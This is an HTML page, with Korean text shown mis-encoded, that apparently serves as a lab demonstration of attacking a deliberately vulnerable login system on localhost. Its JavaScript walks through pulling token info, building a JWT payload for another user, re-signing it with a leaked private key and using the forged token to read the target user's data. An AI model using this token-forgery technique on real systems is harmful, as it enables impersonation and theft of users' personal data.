<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>ê³µê²© ë°ëª¨ - ë¸Œë¼ìš°ì € ë²„ì „</title>
    <script src="https://cdn.jsdelivr.net/npm/jose@4.14.4/dist/browser/index.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .step {
            background: white;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .step h2 {
            color: #1976d2;
            border-bottom: 2px solid #1976d2;
            padding-bottom: 10px;
        }
        .btn {
            padding: 10px 20px;
            background-color: #1976d2;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin: 5px;
        }
        .btn:hover {
            background-color: #1565c0;
        }
        .btn-danger {
            background-color: #d32f2f;
        }
        .result {
            background-color: #f9f9f9;
            padding: 15px;
            border-radius: 4px;
            margin-top: 10px;
            font-family: monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .success {
            background-color: #e8f5e9;
            border: 1px solid #4caf50;
        }
        .error {
            background-color: #ffebee;
            border: 1px solid #d32f2f;
        }
        input[type="number"] {
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            width: 100px;
        }
    </style>
</head>
<body>
    <h1>ğŸ”“ ì·¨ì•½í•œ ì¸ì¦ ì‹œìŠ¤í…œ ê³µê²© ë°ëª¨</h1>
    
    <div class="step">
        <h2>1ë‹¨ê³„: ì •ìƒ ë¡œê·¸ì¸</h2>
        <p>ë¨¼ì € <a href="http://localhost:5001/login" target="_blank">ë¡œê·¸ì¸ í˜ì´ì§€</a>ì—ì„œ alice / password123ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ì„¸ìš”.</p>
        <p>ë¡œê·¸ì¸ í›„ ì´ í˜ì´ì§€ë¡œ ëŒì•„ì™€ì„œ ë‹¤ìŒ ë‹¨ê³„ë¥¼ ì§„í–‰í•˜ì„¸ìš”.</p>
        <button class="btn" onclick="testLogin()">ë¡œê·¸ì¸ ìƒíƒœ í™•ì¸</button>
        <div id="login-result" class="result" style="display: none;"></div>
    </div>
    
    <div class="step">
        <h2>2ë‹¨ê³„: í† í° ì •ë³´ ì¶”ì¶œ</h2>
        <p>ë¸Œë¼ìš°ì € ê°œë°œì ë„êµ¬ (F12)ë¥¼ ì—´ê³  Application íƒ­ > Cookiesì—ì„œ sessionì„ í™•ì¸í•˜ê±°ë‚˜,</p>
        <p>Network íƒ­ì—ì„œ /api/user/1 ìš”ì²­ì˜ Authorization í—¤ë”ë¥¼ í™•ì¸í•˜ì„¸ìš”.</p>
        <button class="btn" onclick="extractToken()">í† í° ì •ë³´ ì¶”ì¶œ (API í˜¸ì¶œ)</button>
        <div id="token-result" class="result" style="display: none;"></div>
    </div>
    
    <div class="step">
        <h2>3ë‹¨ê³„: í† í° ìˆ˜ì • ë° ì¬ì„œëª…</h2>
        <p>íƒ€ê²Ÿ ì‚¬ìš©ì ID: <input type="number" id="target-user-id" value="2" min="1" max="10"></p>
        <p>ìœ ì¶œëœ ê°œì¸í‚¤ë¡œ í† í°ì„ ì¬ì„œëª…í•©ë‹ˆë‹¤.</p>
        <button class="btn btn-danger" onclick="modifyAndResign()">í† í° ìˆ˜ì • ë° ì¬ì„œëª…</button>
        <div id="resign-result" class="result" style="display: none;"></div>
    </div>
    
    <div class="step">
        <h2>4ë‹¨ê³„: íƒ€ì¸ ì •ë³´ ì ‘ê·¼</h2>
        <button class="btn btn-danger" onclick="accessVictimInfo()">íƒ€ê²Ÿ ì‚¬ìš©ì ì •ë³´ ì ‘ê·¼</button>
        <div id="victim-result" class="result" style="display: none;"></div>
    </div>
    
    <script>
        const BASE_URL = 'http://localhost:5001';
        let extractedToken = null;
        let modifiedToken = null;
        
        async function testLogin() {
            const resultDiv = document.getElementById('login-result');
            resultDiv.style.display = 'block';
            resultDiv.className = 'result';
            resultDiv.textContent = 'ë¡œê·¸ì¸ ìƒíƒœ í™•ì¸ ì¤‘...';
            
            try {
                const response = await fetch(`${BASE_URL}/api/user/1`);
                if (response.ok) {
                    resultDiv.className = 'result success';
                    resultDiv.textContent = 'âœ… ë¡œê·¸ì¸ ìƒíƒœ í™•ì¸ ì™„ë£Œ';
                } else {
                    resultDiv.className = 'result error';
                    resultDiv.textContent = 'âŒ ë¡œê·¸ì¸ì´ í•„ìš”í•©ë‹ˆë‹¤. ë¨¼ì € ë¡œê·¸ì¸í•˜ì„¸ìš”.';
                }
            } catch (error) {
                resultDiv.className = 'result error';
                resultDiv.textContent = `âŒ ì˜¤ë¥˜: ${error.message}`;
            }
        }
        
        async function extractToken() {
            const resultDiv = document.getElementById('token-result');
            resultDiv.style.display = 'block';
            resultDiv.className = 'result';
            resultDiv.textContent = 'í† í° ì •ë³´ ì¶”ì¶œ ì¤‘...';
            
            try {
                const response = await fetch(`${BASE_URL}/api/user/1`);
                if (response.ok) {
                    const data = await response.json();
                    extractedToken = data.token_info;
                    resultDiv.className = 'result success';
                    resultDiv.textContent = `âœ… í† í° ì •ë³´ ì¶”ì¶œ ì„±ê³µ:\n\n${JSON.stringify(data.token_info, null, 2)}`;
                } else {
                    resultDiv.className = 'result error';
                    resultDiv.textContent = `âŒ í† í° ì¶”ì¶œ ì‹¤íŒ¨: ${response.status}`;
                }
            } catch (error) {
                resultDiv.className = 'result error';
                resultDiv.textContent = `âŒ ì˜¤ë¥˜: ${error.message}`;
            }
        }
        
        async function modifyAndResign() {
            if (!extractedToken) {
                alert('ë¨¼ì € í† í° ì •ë³´ë¥¼ ì¶”ì¶œí•˜ì„¸ìš” (2ë‹¨ê³„)');
                return;
            }
            
            const resultDiv = document.getElementById('resign-result');
            resultDiv.style.display = 'block';
            resultDiv.className = 'result';
            resultDiv.textContent = 'í† í° ìˆ˜ì • ë° ì¬ì„œëª… ì¤‘...';
            
            try {
                const targetUserId = parseInt(document.getElementById('target-user-id').value);
                
                // ì‚¬ìš©ì ëª©ë¡ ì¡°íšŒ
                const usersResponse = await fetch(`${BASE_URL}/users`);
                const users = await usersResponse.json();
                const targetUser = users.find(u => u.id === targetUserId);
                
                if (!targetUser) {
                    throw new Error('íƒ€ê²Ÿ ì‚¬ìš©ìë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.');
                }
                
                // í† í° payload ìˆ˜ì •
                const now = Math.floor(Date.now() / 1000);
                const modifiedPayload = {
                    user_id: targetUserId,
                    username: targetUser.username,
                    email: targetUser.email,
                    iat: now,
                    exp: now + 86400, // 24ì‹œê°„
                    iss: 'vulnerable-app'
                };
                
                // ì„œë²„ì—ì„œ ì¬ì„œëª… (ì‹¤ì œë¡œëŠ” ë¸Œë¼ìš°ì €ì—ì„œ ì§ì ‘ í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ)
                // ì—¬ê¸°ì„œëŠ” ì„œë²„ APIë¥¼ í†µí•´ ì¬ì„œëª…
                const resignResponse = await fetch(`${BASE_URL}/api/resign-token`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        payload: modifiedPayload,
                        key_path: 'leaked_private_key.pem'
                    })
                });
                
                if (resignResponse.ok) {
                    const data = await resignResponse.json();
                    modifiedToken = data.token;
                    resultDiv.className = 'result success';
                    resultDiv.textContent = `âœ… í† í° ìˆ˜ì • ë° ì¬ì„œëª… ì™„ë£Œ!\n\nìˆ˜ì •ëœ Payload:\n${JSON.stringify(modifiedPayload, null, 2)}\n\nì¬ì„œëª…ëœ í† í°:\n${modifiedToken}`;
                } else {
                    // ì„œë²„ APIê°€ ì—†ìœ¼ë©´ ì§ì ‘ ì‹œë„ (ì‹¤ì œë¡œëŠ” ë¶ˆê°€ëŠ¥í•˜ì§€ë§Œ ë°ëª¨ìš©)
                    resultDiv.className = 'result error';
                    resultDiv.textContent = `âŒ ì„œë²„ ì¬ì„œëª… APIê°€ ì—†ìŠµë‹ˆë‹¤.\n\nPython ìŠ¤í¬ë¦½íŠ¸(exploit.py)ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜,\nì„œë²„ì— /api/resign-token ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì¶”ê°€í•˜ì„¸ìš”.`;
                }
            } catch (error) {
                resultDiv.className = 'result error';
                resultDiv.textContent = `âŒ ì˜¤ë¥˜: ${error.message}`;
            }
        }
        
        async function accessVictimInfo() {
            if (!modifiedToken) {
                alert('ë¨¼ì € í† í°ì„ ìˆ˜ì •í•˜ê³  ì¬ì„œëª…í•˜ì„¸ìš” (3ë‹¨ê³„)');
                return;
            }
            
            const resultDiv = document.getElementById('victim-result');
            resultDiv.style.display = 'block';
            resultDiv.className = 'result';
            resultDiv.textContent = 'íƒ€ê²Ÿ ì‚¬ìš©ì ì •ë³´ ì ‘ê·¼ ì‹œë„ ì¤‘...';
            
            try {
                const targetUserId = parseInt(document.getElementById('target-user-id').value);
                const response = await fetch(`${BASE_URL}/api/user/${targetUserId}`, {
                    headers: {
                        'Authorization': `Bearer ${modifiedToken}`
                    }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    resultDiv.className = 'result success';
                    resultDiv.textContent = `âœ… ê³µê²© ì„±ê³µ! íƒ€ê²Ÿ ì‚¬ìš©ì ì •ë³´ ìœ ì¶œ:\n\n${JSON.stringify(data, null, 2)}`;
                } else {
                    const errorText = await response.text();
                    resultDiv.className = 'result error';
                    resultDiv.textContent = `âŒ ê³µê²© ì‹¤íŒ¨: ${response.status}\n${errorText}`;
                }
            } catch (error) {
                resultDiv.className = 'result error';
                resultDiv.textContent = `âŒ ì˜¤ë¥˜: ${error.message}`;
            }
        }
    </script>
</body>
</html>

